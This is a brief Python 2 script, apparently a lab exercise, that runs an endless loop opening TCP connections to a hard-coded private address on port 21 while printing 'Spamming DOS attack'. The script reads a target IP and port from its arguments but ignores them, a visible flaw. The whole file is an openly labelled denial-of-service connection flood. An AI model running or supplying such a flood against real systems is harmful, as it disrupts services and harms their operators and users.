#!/usr/bin/python

import socket, sys

ip = sys.argv[1]
port = sys.argv[2]
    
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.2.4", 21))
    print "Spamming DOS attack on ",ip," port ",port
